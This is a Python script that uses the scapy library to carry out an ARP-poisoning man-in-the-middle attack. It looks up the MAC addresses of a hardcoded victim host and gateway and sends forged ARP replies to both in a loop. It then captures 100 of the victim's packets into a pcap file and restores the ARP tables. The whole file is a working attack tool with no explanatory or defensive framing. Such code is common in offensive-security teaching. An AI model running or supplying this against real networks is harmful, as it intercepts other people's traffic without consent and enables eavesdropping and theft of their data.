import sys
import time
from multiprocessing import Process

from scapy.config import conf
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, sniff, send
from scapy.utils import wrpcap


GATEWAY_IP = "192.168.1.1"
TARGET_IP = "192.168.1.57"


def get_mac(target_ip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", pdst=target_ip)
    resp, _ = srp(
        packet, timeout=2, retry=10, verbose=False
    )
    for _, r in resp:
        return r[Ether].src
    return None


class Arper: # noqa
    def __init__(self, victim, gateway, interface="wlp1s0"):
        self.victim = victim
        self.victim_mac = get_mac(victim)
        self.gateway = gateway
        self.gateway_mac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f"Initialized {interface}")
        print(f"Gateway ({gateway}) is at {self.gateway_mac}.")
        print(f'Victim ({victim}) is at {self.victim_mac}')
        print("*" * 30)

    def run(self):
        self.poision_porcess = Process(target=self.poison)
        self.poision_porcess.start()

        self.sniff_porcess = Process(target=self.sniff)
        self.sniff_porcess.start()

    def poison(self):
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victim_mac
        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac dst: {poison_victim.hwdst}')
        print(f'mac src: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-' * 30)

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.hwdst = self.gateway_mac
        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac_src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-' * 30)
        print(f'Beginning the ARP poison. [CTRL-C to stop]')
        while True:
            sys.stdout.write(".")
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def restore(self):
        print("Restoring ARP Tables")
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gateway_mac,
            pdst=self.victim,
            hwdst="ff:ff:ff:ff:ff:ff",), count=5)

        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victim_mac,
            pdst=self.gateway,
            hwdst="ff:ff:ff:ff:ff:ff",), count=5)

    def sniff(self, count=100):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = f"ip host {self.victim}"
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print("Got the packets")
        self.restore()
        self.poision_porcess.terminate()
        print("Finished")


if __name__ == '__main__':
    arper = Arper(TARGET_IP, GATEWAY_IP)
    arper.run()
